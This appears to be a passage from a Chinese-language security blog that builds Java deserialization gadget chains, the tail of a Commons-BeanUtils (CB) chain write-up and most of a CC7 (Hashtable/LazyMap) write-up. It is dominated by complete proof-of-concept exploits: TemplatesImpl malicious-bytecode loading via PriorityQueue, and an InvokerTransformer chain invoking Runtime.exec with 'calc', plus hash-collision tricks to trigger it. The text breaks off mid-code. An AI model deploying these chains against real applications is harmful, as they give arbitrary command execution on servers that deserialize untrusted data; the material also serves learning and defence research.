成功按照预期弹出一个计算机。还有就是存在一个和之前一样的问题，当我利用TemplatesImpl来动态加载恶意字节码的时候，如果我add进两个tem，只会弹出一个计算机，在第一个结束后会直接报错结束，并不会进入第二个利用点： 比如CC4等。\n还有一个需要注意的点就是这里add进的顺序也有讲究，比如我像上面代码那样只add进一个，那么我必须保证tem在o1，因为o1/o2必须为一个类实例，按照前面将的参数问题，o1对应add2，也就是我要在第二个地方add进tem，否则会直接报错退出。\n那么我们现在继续关注第二次add后会发生什么： 在前面抛出异常后，不知道调用compare()方法后到底会返回什么，那么我们直接打断点来看会到哪里，发现确实会在抛出异常后直接退出，那么这样我们并不能成功在queue[1]成功设置为tem，从而导致后续都失败。\n在ysoserial中给出了解决方法，我们可以先往里面随便add进值，然后再反射更改为我想利用的，那么测试代码可以改为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 然后这里报错了我们上面说的问题，PropertyUtils的getProperty的方法第一个参数需要为类实例，但是我们这里传入的都是整数，所以在第二次add后会报错。\n解决方法，在BeanComparator的compare()方法中： 这里只要满足property为null，就不会再调用getProperty()方法，而是正常的compare方法来比较。\n所以我们这里可以使得property先为null，而后再反射修改这个值为outputProperties。\n那么POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); //错误点 Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 继续报错\n然后思考，这里逻辑明明没有问题，但是为啥还是弹这个问题，然后我尝试修改为传入两个tem，成功弹出计算机，然后再仔细比对一下，找出问题所在，问题处在前面的POC标出来了，感兴趣的可以先自己想想。\n我前面的POC构造是按照序列化前的add()部分构造的，其中的顺序需要为：\nadd1为其他，必须add2为tem。\n但是在反序列化过程中\n注意前面分析时给出的结果，在反序列时调用到BeanComparator的compare()方法时的参数分别为**（x：queue[0]，c：queue[1]）**。\n所以这里是先调用的queue[0]，同时结合我们前面的说法，只会调用一次，所以我们这里需要，如下设置：\n1 Object[] x = new Object[]{tem,1}; 那么最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{tem,1}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功按照预期弹出一个计算机。\n","date":"2025-01-22T14:02:39+08:00","permalink":"https://fupanc-w1n.github.io/p/cb%E9%93%BE/","title":"CB链"},{"content":"CC7 CC7的思路同样是找另一条调用链来触发lazy.get()方法，这次用到的是Hashtable类\n测试环境：\nJDK 8u411 commons-collections 3.2.1 代码分析 在ysoserial给出的调用链中，选取了java.util.Hashtable#readObject方法作为调用链的起点。\nHashtable 与 HashMap很相似，都是一种key-value形式的哈希表，但是还是有区别：\nHashMap 与 Hashtable的父类不一样。 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。 Hashtable 的key-value 不允许为null值，但是HashMap 是允许的，后者会将 key=value的实体放在index=0 的位置。 Hashtable 线程安全，HashMap 线程不安全。 同样的，既然HashMap可以实现反序列化漏洞，Hashtable同样可以。\n分析源码，这个Hashtable类可以给出两条链，分别是\nreadObject()中的reconstitution()的hashCode()方法 readObject()中的reconstitution()的equal()方法 hashCode （其实给这个都可以算到CC6那里去，利用思路和CC6差不多）\n我们来看一下Hashtable的readObject()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new StreamCorruptedException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); int origlength = s.readInt(); int elements = s.readInt(); if (elements \u0026lt; 0) throw new StreamCorruptedException(\u0026#34;Illegal # of Elements: \u0026#34; + elements); origlength = Math.max(origlength, (int)(elements / lf) + 1); int length = (int)((elements + elements / 20) / lf) + 3; if (length \u0026gt; elements \u0026amp;\u0026amp; (length \u0026amp; 1) == 0) length--; length = Math.min(length, origlength); if (length \u0026lt; 0) { // overflow length = origlength; } SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length); Hashtable.UnsafeHolder.putLoadFactor(this, lf); table = new Entry\u0026lt;?,?\u0026gt;[length]; threshold = (int)Math.min(length * lf, MAX_ARRAY_SIZE + 1); count = 0; for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // sync is eliminated for performance reconstitutionPut(table, key, value); } } 重点还是最后面那串代码，如下： 在readObject方法中，最后调用了reconstitutionPut方法将反序列化得到的key-value 放在内部实现的 Entry 数组 table里。\n跟进reconstitutionPut方法源码：\n可以看见这个reconstitutionPut()里面也调用了hashCode，并且可以很容易看出value不能为null。感觉和HashMap是差不多的，看一下Hashtable类的put()方法： 和CC6那就差不多了，这不就直接可以构造了吗\n直接按照CC6的HashMap的链子原理构造代码即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); TiedMapEntry outerMap = new TiedMapEntry(lazy,\u0026#34;fupanc\u0026#34;); Hashtable hashMap = new Hashtable(); hashMap.put(outerMap,\u0026#34;fupanc\u0026#34;); haha.remove(\u0026#34;fupanc\u0026#34;);//这里注意fupanc所属对象，使用lazy也行 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 成功弹出计算机。\n————————\nequals 但是ysoserial链中的利用点却不是上面那个简单链，继续分析这个Hashtable类的代码。\n先给出利用链要用到的类以及对应方法的源码：\nHashMap的父类AbstractMap类的equals()方法源码（get方法的起点）： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public boolean equals(Object o) { if (o == this) return true; if (!(o instanceof Map)) return false; Map\u0026lt;?,?\u0026gt; m = (Map\u0026lt;?,?\u0026gt;) o; if (m.size() != size()) return false; try { Iterator\u0026lt;Entry\u0026lt;K,V\u0026gt;\u0026gt; i = entrySet().iterator(); while (i.hasNext()) { Entry\u0026lt;K,V\u0026gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) { if (!(m.get(key)==null \u0026amp;\u0026amp; m.containsKey(key))) return false; } else { if (!value.equals(m.get(key)))//这里调用了get方法 return false; } } } catch (ClassCastException unused) { return false; } catch (NullPointerException unused) { return false; } return true; } LazyMap的父类AbstractMapDecorator的equals()方法源码：\n1 2 3 public boolean equals(Object object) { return object == this ? true : this.map.equals(object); } 在Hashtable 的readObject() 方法中用到了for循环，如下：\n这里的elements代表键值对的个数，这里调用for循环来一次读取一个键值对。并且在反序列化过程中，table(也就是reconstitution方法内的tab)是共享的，也就是说在整个反序列化过程中始终使用同一个 tab，所有的键值对都将被插入到同一个 tab 中，构成一个完整的哈希表，并且看Hashtable类中也有这个变量：\ntable在Hashtable也是有定义的，结合前面的说明，可以知道在反序列化的时候会将键值对放入到这个数组中，但是这里的table是transient修饰的，导致不会被序列化，那么这是如何解决的呢？重点就是在Hashtable#writeObject()方法，源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 private void writeObject(java.io.ObjectOutputStream s) throws IOException { Entry\u0026lt;Object, Object\u0026gt; entryStack = null; synchronized (this) { s.defaultWriteObject(); s.writeInt(table.length); s.writeInt(count); for (int index = 0; index \u0026lt; table.length; index++) { Entry\u0026lt;?,?\u0026gt; entry = table[index]; while (entry != null) { entryStack = new Entry\u0026lt;\u0026gt;(0, entry.key, entry.value, entryStack); entry = entry.next; } } } while (entryStack != null) { s.writeObject(entryStack.key); s.writeObject(entryStack.value); entryStack = entryStack.next; } } 在这个writeObject()方法中，定义了一个entryStack用于暂时存储所有的键值对，赋值就是在for循环中，在这个for循环中，遍历table数组的每个Entry对象，将其填入entryStack数组中，最后在while循环中将每个键值对序列化。\n继续看reconstitutionput()方法：\n这个for循环代码会遍历链表，直到链表末尾。同时在for循环内部，可以看到只要当前节点的哈希值与目标哈希值相等以及当前节点的键与目标键相等就会抛出异常\n所以这个代码的作用就是确保哈希表中不会出现重复的键。如果在遍历链表过程中发现有节点的哈希值和键都与目标值相同，就会抛出 StreamCorruptedException 异常。这可能用于序列化/反序列化过程中，防止数据结构被破坏或出现不一致的情况。\n如果没有重复的键，在这个for循环过后，将会将这个键值对填入到table数组中：\n既然这里都说明了是利用equal()方法来创建利用链，在这个reconstitutionPut()方法源码中，可以看到在for循环那里要利用到了equals()方法：\n由于java中的\u0026amp;\u0026amp;有短路求值的特性，必须要前一个条件（e.hash == hash）为真，才会进行第二个条件（e.key.equals(key)）的判断。\n所以我们这里至少put进两个键值对，这样在第二个键值对与第一个键值对比较时才有可能通过第一个条件。\n再结合前面提前给出的类，大概可以知道利用链了，这里将e.key设置为LazyMap类实例，但是LazyMap中并没有直接定义equals()方法（内部类有，但是不能直接调用），这样就会调用LazyMap的父类AbstractMapDecorator的equals()方法：\n这里的this 关键字在方法中代表当前类的实例，即调用该方法的对象。如果相同就会直接返回ture，否则就会调用后面的。而我们的利用链就是要调用后面的。\n由于我们实例化LazyMap时，都是传入一个HashMap类实例，最终会将AbstractMapDecorator的this.map设置为HashMap类的实例化对象，这样就会调用HashMap类的equals()方法，但是情况同LazyMap一样，会直接调用父类AbstractMap的equals()方法（部分源码）：\n然后在AbstractMap的equals()方法中调用了get()方法，这就是起点，并且这里的m就是e.key.equals(key)中的第二个key，所以我们需要传入两个LazyMap实例。\n大概就是这样了，现在来搓代码。\n综合前面的问题：\n需要传入两个键值对。需要将e.key设置为LazyMap对象，即key都是LazyMap对象 hash相等问题 先给个基本盘：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import java.util.HashMap; import java.util.Hashtable; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Map haha = new HashMap(); Map lazy = LazyMap.decorate(haha,chain); Hashtable hashtable = new Hashtable(); //这里开始想代码 Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } } 现在聚焦于readObject()的reconstitutionPut方法：\n这里要求前面的条件相等，并且后面的e.key需要为LazyMap类实例，那么我就传入两个LazyMap类实例\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); 再粘过来Hashtable类的put方法一下： 这样就可以基本说明为什么我可以调用Hashtable的put方法了（需要注意的是第一次put不会触及for循环，因为table无任何条目，第二次put才会开始比较）。\n但是需要注意的是，当我传入了LazyMap实例，无论是反序还是put方法这里，在key.hashCode()都不会是首先调用默认的String.java的hashCode()方法了，由于LazyMap没有定义hashCode方法，这里就会到父类AbstractMapDecorator的hashCode方法：\n这里就会又到HashMap（HashMap内部类有hashCode，不可用）父类AbstractMap的hashCode()方法： （这里往后的hashCode()方法调用过程是后面的某个测试代码调试出来的，可以先只暂时了解）然后这里调用的hashCode是HashMap内部类Node类的hashCode()方法，如下：\n然后差不多就到了String.java的hashCode方法：\nString.java的hashCode()就是用来计算哈希码的。同时注意（重要）：在上上面那个hashCode()，也就是内部类Node的hashCode()方法对key和value都调用了hashCode()计算哈希码后异或求得值，也就是最终的哈希码，所以对于最终的哈希码我们需要兼顾键和值。\n————\n结合String.java的hashCode方法，可以知道AbstractMap的hashCode方法的作用就是计算哈希码，通过迭代器遍历每个条目，调用每个条目的hashCode()方法，然后将得到的哈希码累加到变量h中。最后返回h。\n但是由于我们最开始调用的hashCode()是LazyMap对象，并且由于这个对象里面并没有存储有键值对，所以这里会直接返回0。\n本来我还以为刚好，这样都返回0的话正好使得e.hash=hash可以成立，但是需要注意的是，当我们在序列化之前调用put()的时候，看put()方法的如下源码：\n他这里也有个for循环来防止有重复的键，这个代码的作用就是如果条件成立，也就是条目相匹配，就会将条目entry对应的键的value更改为新的value。再来看我们的代码：\n1 2 3 4 5 6 7 8 9 10 Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); Hashtable haha = new Hashtable(); haha.put(lazy0,1); haha.put(lazy1,1); 现在的问题就是想这个entry.key.equals(key)是否会通过导致无法正常放入两个键值对。\n直接从第二次放入键值对开始说，这里由于我放入的是LazyMap类实例，本来以为会按照我们前面说的流程走一遍，最后会调用到AbstractMap类的equals()停下，大错特错。看代码\n直接使用如下代码来测试：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;相等\u0026#34;); } } } //output:相等 这里的输出为相等，那这就是说明会进入if条件，导致不能成功放入两个键值对。但是在前面的分析中，如果想要成功构造利用链，那么就必须是传入两个LazyMap的实例。所以这里要想如何解决。打断点来调试一下： 直接按照预期进入到LazyMap父类AbstractMapDecorator的equals()方法： 在前面基本流程那里说过，这里就是判断调用这个equals()方法的对象和传入的object引用的对象是否相同，很不巧的是我们都传入了LazyMap对象，导致了这里使得条件成立，返回true。\n但是，柳暗花明又一村，在调试时，在上面点击下一步后，看：\n这里还要调用一次size()方法（这个size()方法过后就没按照预期走了），所以这里会调用HashMap的size()方法\n这个HashMap的size()方法只是返回当前 HashMap 中存储的键值对的总数。\n这里提到了键值对，那么我们添加一个键值对试试，这里直接对LazyMap对象使用put也行，因为LazyMap的父类实现了put方法： 代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xxx\u0026#34;,2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxx\u0026#34;,1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;相等\u0026#34;); } } } 这次没有输出，说明这里不相同了，不会进入false，也就可以放入两个值了。\n（遗留一个问题吧，没调出来这里为什么会直接到size()并且影响判断）\n并且这里在调试时确实可以进入到最后的AbstractMap的equals()方法并且最终成功调用LazyMap的get方法： 问题equals()方法调用解决。\n那么现在我们又需要注意第一个条件，前面是直接设定的没有键值对，但是由于第二个条件的解决办法，导致我们这里必须要思考如何使得hash相同，最后调用的hashCode方法： 接用代码测试看看：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;xx\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;xxxx\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;相等\u0026#34;); } } } 没有输出，说明不是相同的。这里就涉及到了哈希碰撞的问题，不多说，在ysoserial链中调用的是yy和zZ，这两个值的hashCode()结果是相同的： 同时结合前面最开始调试hashCode那部分说了会调用到HashMap内部类Node的hashCode()方法： 所以这里的value也需要设置为相同的，所以最终的测试代码为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy1.hashCode()==lazy0.hashCode()){ System.out.println(\u0026#34;相等\u0026#34;); } } } 成功输出相等。\n但是此时将这个代码稍微修改一下又可以用来测试第二个条件（但是有问题），如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import java.util.HashMap; import java.util.Map; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; public class Main { public static void main(String[] args){ Transformer haha0 = new ConstantTransformer(1); Transformer haha1 = new ConstantTransformer(1); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,haha0); lazy0.put(\u0026#34;yy\u0026#34;, 1); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,haha1); lazy1.put(\u0026#34;zZ\u0026#34;, 1); if(lazy0.equals(lazy1)){ System.out.println(\u0026#34;相等\u0026#34;); } } } //输出：相等 很怪反正，代码绝对有问题，要么就是我的JVM虚拟机有点问题，直接在最终equals()方法加断点可以到，这里不管put进的键是什么，只要两个值都是1就会输出相等（好像only 1），但是这里都改成其他的比如2就不会了，改成2对于hashCode应该也没有影响，并且代码输出也没有问题。\n那么就可以尝试构造真正的利用链了，还需要注意的就是在第二次put的时候就会执行一次调用链了，此时就需要注意LazyMap的get()方法，和之前的CC6差不多，需要remove，直接打断点来看传进去的值：\n再看进入这个get方法的equals()方法的位置：\n此时的key是lazy0的键，所以这里会对lazy1的哈希表再put进一个值：\n这里结果是1很正常，fakeTransformer链子返回的就是这个。\n所以序列化的时候会向hashMap1中put进一个（yy-1）的键值对，为了在反序列化的时候，让hash值相等，能够成功执行到这里的transform()方法，所以需要remove这个hashMap1中的这个键值对。\n最终构成如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.Runtime; import java.lang.reflect.Field; public class Main{ public static void main(String[] args) throws Exception { Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainpart = new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}),new ConstantTransformer(1)}; Transformer chain = new ChainedTransformer(fakeTransformer); Hashtable hashtable = new Hashtable(); Map hashMap0 = new HashMap(); Map lazy0 = LazyMap.decorate(hashMap0,chain); lazy0.put(\u0026#34;yy\u0026#34;, 2); Map hashMap1 = new HashMap(); Map lazy1 = LazyMap.decorate(hashMap1,chain); lazy1.put(\u0026#34;zZ\u0026#34;, 2); hashtable.put(lazy0,1); hashtable.put(lazy1,2); hashMap1.remove(\u0026#34;yy\u0026#34;); Field x = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); x.setAccessible(true); x.set(chain,chainpart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashtable); 